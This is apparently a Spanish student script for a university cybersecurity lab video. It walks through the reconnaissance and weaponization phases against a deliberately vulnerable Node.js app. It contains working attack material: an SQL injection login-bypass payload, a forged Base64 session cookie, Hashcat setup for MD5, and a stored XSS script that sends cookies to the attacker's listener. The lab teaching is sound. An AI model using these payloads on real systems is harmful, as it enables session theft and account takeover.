# 🎬 Guión Técnico Escénico y Narrativo — Video de Defensa (Fases I y II)

> **Universidad Católica Andrés Bello · Facultad de Ingeniería · Ciberseguridad**  
> **Proyecto:** VulnApp — Simulación Red Team / Blue Team  
> **Formato:** Guión de Acción Simultánea (Lo que se ejecuta en pantalla + Lo que se habla palabra por palabra)

---

# 🟢 FASE I: RECONOCIMIENTO (RECONNAISSANCE)

---

### PASO 1.1: Apertura de la sesión y fuzzing activo con `ffuf`

* 🖥️ **Acción Visual:**
  El estudiante abre la terminal de Kali Linux (`192.168.56.10`), se posiciona en el escritorio y escribe el comando de fuzzing con `ffuf`. Mientras el comando ejecuta, se ve cómo van saliendo las rutas HTTP con sus códigos de respuesta `200` y `401`.

* ⌨️ **Comando a ejecutar:**
  ```bash
  ffuf -u http://192.168.56.20:4000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,405 -t 10
  ```

* 🗣️ **Guión Hablado (Decir esto exactamente mientras ejecuta en pantalla):**
  > *"Saludos a todos. Damos inicio formal a la demostración práctica de nuestro proyecto de Ciberseguridad, comenzando con el despliegue del Red Team bajo el marco metodológico Cyber Kill Chain. Nos encontramos en la primera etapa: la Fase I de Reconocimiento.*  
  > *En estricto cumplimiento con los lineamientos del laboratorio y rechazando el uso de escáneres masivos automatizados de vulnerabilidades, procedemos a realizar un mapeo de la superficie de ataque utilizando la herramienta de fuzzing nativa `ffuf`. Estamos enviando peticiones HTTP controladas a la dirección IP de nuestro servidor objetivo en Ubuntu Server, `192.168.56.20`, operando en el puerto 4000.*  
  > *Como pueden observar en tiempo real en la pantalla, al evaluar las respuestas y códigos de estado HTTP devueltos por la aplicación, logramos descubrir la existencia de los endpoints principales de la API REST: `/api/login`, `/api/register`, `/api/search` y `/api/message`. Estos puntos de entrada representan la superficie de exposición sobre la cual analizaremos la seguridad del sistema."*

---

### PASO 1.2: Registro de un usuario estándar legítimo

* 🖥️ **Acción Visual:**
  En la misma terminal, el estudiante escribe el comando `curl` para enviar una petición HTTP POST al endpoint `/api/register` creando el usuario de pruebas.

* ⌨️ **Comando a ejecutar:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/register \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```

* 🗣️ **Guión Hablado (Decir esto exactamente mientras se presiona Enter y aparece `201 Created`):**
  > *"Una vez identificada la superficie de exposición, nos disponemos a estudiar el comportamiento normal de la aplicación sin alterar ni comprometer el sistema. Para ello, interactuamos directamente con el endpoint de registro `/api/register` enviando un objeto JSON limpio que contiene las credenciales de un usuario estándar de pruebas.*  
  > *Al presionar Enter, observamos que el servidor backend desarrollado en Node.js y Express nos responde con un código de estado `HTTP 201 Created`, confirmando que la cuenta ha sido dada de alta correctamente en la base de datos."*

---

### PASO 1.3: Autenticación e inspección de cabeceras HTTP (`Set-Cookie`)

* 🖥️ **Acción Visual:**
  El estudiante escribe el comando `curl -i` para autenticarse en `/api/login`. Al recibir la respuesta, utiliza el puntero del ratón para sombreado/resaltar la cabecera `Set-Cookie` que aparece en la terminal.

* ⌨️ **Comando a ejecutar:**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```

* 🗣️ **Guión Hablado (Decir esto exactamente mientras se resalta la cabecera `Set-Cookie`):**
  > *"Ahora realizamos el proceso de autenticación enviando una petición HTTP POST al endpoint `/api/login`. Noten que estamos utilizando la bandera `-i` en `curl`, la cual nos permite inspeccionar de manera transparente todas las cabeceras de la respuesta HTTP emitidas por el servidor Express.js.*  
  > *Al recibir la respuesta exitosa `HTTP 200 OK`, dirigimos nuestra atención a la cabecera de respuesta `Set-Cookie`. Observen cómo el servidor asigna una cookie de sesión denominada `session`, la cual contiene una cadena de caracteres aparentemente codificados. Esta galleta de sesión es el único token que el navegador utilizará en lo adelante para validar la identidad del usuario en cada petición subsiguiente."*

---

### PASO 1.4: Decodificación en texto plano y diagnóstico de Fallas Criptográficas

* 🖥️ **Acción Visual:**
  El estudiante copia la cadena Base64 devuelta en la cookie (por ejemplo: `eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9`), escribe el comando `echo "cadena" | base64 -d` y presiona Enter. En pantalla se imprime el JSON decodificado.

* ⌨️ **Comando a ejecutar:**
  ```bash
  echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9" | base64 -d
  ```

* 🗣️ **Guión Hablado (Decir esto mientras se muestra el JSON decodificado `{"userId":2,"username":"usuario_prueba","role":"user"}`):**
  > *"Para verificar la robustez de este mecanismo de control de estado, tomamos el valor de la cookie y lo procesamos nativamente en la consola con el comando de decodificación `base64 -d`.*  
  > *Como pueden apreciar en pantalla, la cadena se decodifica instantáneamente revelando un objeto JSON en texto plano con la estructura: `userId: 2`, `username: usuario_prueba` y `role: user`.*  
  > *Este hallazgo nos permite diagnosticar formalmente una deficiencia estructural dentro de la categoría **OWASP A04:2025 - Fallas Criptográficas**, fundamentada en dos debilidades específicas del catálogo de debilidades comunes:*  
  > *Primero, **CWE-311: Falta de Cifrado de Datos Sensibles**. La aplicación transmite y almacena información sensible de la sesión utilizando Base64, el cual es un esquema de codificación pública para transporte de datos, no un algoritmo de cifrado confidencial.*  
  > *Segundo, **CWE-345: Verificación Insuficiente de Autenticidad de Datos**. La cookie entregada por el servidor no cuenta con un código de autenticación de mensajes basado en hash, es decir, no posee una firma HMAC ni token criptográfico. Esto significa que la confianza del estado recae ciegamente en lo que el cliente envíe. Con esta constatación teórica y práctica, damos por concluida con éxito la Fase I de Reconocimiento."*

---

# 🟡 FASE II: ARMAMENTO (WEAPONIZATION)

---

### PASO 2.1: Análisis de la vulnerabilidad SQLi en el código fuente y diseño del Payload

* 🖥️ **Acción Visual:**
  El estudiante abre en pantalla el archivo `payload_sqli.json` o muestra en un editor de texto el fragmento vulnerable del archivo `vulnerable/server.js`:
  ```javascript
  const query = `
    SELECT id, username, role, email, password
    FROM users
    WHERE username = '${username}'
    AND   password = '${md5(password)}'
  `;
  ```

* ⌨️ **Comando a ejecutar (Creación del archivo payload en Kali):**
  ```bash
  cat << 'EOF' > payload_sqli.json
  {"username": "' OR 1=1 OR '1'='1", "password": "x"}
  EOF
  cat payload_sqli.json
  ```

* 🗣️ **Guión Hablado (Decir esto mientras se muestra el código y se crea el archivo JSON):**
  > *"Entramos a la Fase II de nuestra metodología: Armamento. En esta etapa preparamos y construimos los vectores de ataque en la máquina atacante Kali Linux antes de su entrega.*  
  > *Comenzamos diseñando el exploit para la vulnerabilidad de **Inyección SQL (CWE-89)** enmarcada en **OWASP A05:2025 - Inyección**. Al examinar la estructura del backend en Node.js, observamos que el servidor procesa la consulta de autenticación concatenando directamente la variable `username` dentro de un Template Literal multilínea en JavaScript.*  
  > *Aquí ocurre un fenómeno técnico fundamental: los payloads clásicos de inyección SQL que intentan comentar el resto de la consulta mediante secuencias como `--` o `/*` resultan totalmente ineficaces. Esto se debe a que la consulta está distribuida en varias líneas físicas de código, por lo que el caracter de comentario `--` solo anula la línea donde se inyecta el usuario, dejando intacta la línea inferior donde se valida la contraseña con `AND password = ...`.*  
  > *Para superar esta restricción arquitectónica, calibramos un payload basado en **lógica booleana pura**: `' OR 1=1 OR '1'='1`. Al ser inyectado, la consulta en la base de datos SQLite se transforma estructuralmente en:*  
  > `WHERE username = '' OR 1=1 OR '1'='1 AND password = '...'`  
  > *Dado que la proposición `1=1` es una tautología matemática irrefutable, toda la condición lógica de la cláusula `WHERE` se evalúa como Verdadera (`TRUE`), anulando la exigencia de la contraseña sin requerir comentarios de código. Guardamos este payload en el archivo `payload_sqli.json`."*

---

### PASO 2.2: Construcción y codificación del vector para Cookie Tampering

* 🖥️ **Acción Visual:**
  El estudiante muestra en la consola de Kali cómo altera el JSON del objeto de sesión y cómo lo convierte a Base64 antes de lanzarlo.

* ⌨️ **Comando a ejecutar:**
  ```bash
  echo -n '{"userId":1,"username":"usuario_prueba","role":"user"}' | base64 -w 0
  ```

* 🗣️ **Guión Hablado (Decir esto mientras se ejecuta el comando y se muestra el resultado en Base64):**
  > *"A continuación, armamos el vector de explotación para la falla criptográfica **CWE-345 de Verificación Insuficiente de Autenticidad**. Afrontando la corrección establecida por la profesora, este ataque no se enfoca en un escalado de roles a nivel de aplicación, sino en demostrar la suplantación de identidad por manipulación de identificadores.*  
  > *Construimos un payload JSON en el cual alteramos el campo `userId`, cambiando el identificador `2` correspondiente al usuario estándar, por el identificador `1`, correspondiente al primer usuario registrado en la base de datos.*  
  > *Procedemos a codificar esta estructura adulterada en Base64 usando la herramienta de consola. Debido a que en la Fase I confirmamos la ausencia total de un código HMAC de verificación de integridad en el backend, empaquetamos esta cookie adulterada para inyectarla en la cabecera HTTP durante la fase de entrega."*

---

### PASO 2.3: Configuración del entorno de criptoanálisis con Hashcat

* 🖥️ **Acción Visual:**
  El estudiante muestra en la terminal la presencia del diccionario de contraseñas de Kali y la verificación de la sintaxis de Hashcat para ataques sobre hashes MD5.

* ⌨️ **Comando a ejecutar:**
  ```bash
  ls -lh /usr/share/wordlists/rockyou.txt
  hashcat --help | grep -E "\-m 0"
  ```

* 🗣️ **Guión Hablado (Decir esto mientras se ejecutan los comandos de verificación):**
  > *"Para vulnerar la confidencialidad de las credenciales de la base de datos, preparamos la fase de análisis criptoanalítico contra tres debilidades criptográficas severas:*  
  > *1. **CWE-327: Uso de un Algoritmo Criptográfico Rompible**, al utilizar MD5.*  
  > *2. **CWE-759: Uso de un Hash Unidireccional sin Sal**, lo que genera hashes idénticos y deterministas.*  
  > *3. **CWE-916: Esfuerzo Computacional Insuficiente**, al ser MD5 un algoritmo diseñado para velocidad y no para protección de contraseñas.*  
  > *En la máquina atacante Kali Linux, verificamos la disponibilidad del diccionario masivo `rockyou.txt` y configuramos la suite `Hashcat` especificando el parámetro `-m 0`, correspondiente al modo de ataque directo sobre hashes MD5 puros. Las armas quedan calibradas para revertir cualquier hash extraído en cuestión de segundos."*

---

### PASO 2.4: Ensamblaje del Gusano Autorreplicante Stored XSS y Servidor C2

* 🖥️ **Acción Visual:**
  El estudiante muestra en pantalla el código JavaScript del script malicioso que se inyectará en la mensajería, destacando las líneas de exfiltración.

* ⌨️ **Código a mostrar en pantalla:**
  ```html
  <script>
  (async function(){
    fetch('http://192.168.56.10:8888/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});
  })();
  </script>
  ```

* 🗣️ **Guión Hablado (Decir esto mientras se muestra el código JavaScript):**
  > *"Por último, ensamblamos el arma ofensiva para la categoría **OWASP A05:2025 - Stored XSS (CWE-79: Cross-Site Scripting)** combinada con **CWE-116: Codificación Inadecuada de Salida**.*  
  > *Programamos un payload en JavaScript asíncrono autocontenido que se alojará de forma persistente en la base de datos a través del endpoint de mensajes. Al ser interpretado por el navegador de cualquier víctima debido al uso de `innerHTML` en el frontend, el script ejecutará una exfiltración sigilosa de la cookie de sesión mediante una petición `fetch` asíncrona apuntando a nuestro listener de Comando y Control (C2) en la IP `192.168.56.10` en el puerto `8888`.*  
  > *Con todos nuestros vectores calibrados, probados y justificados teóricamente, damos por finalizada la Fase II de Armamento y estamos listos para la fase de ejecución."*

---
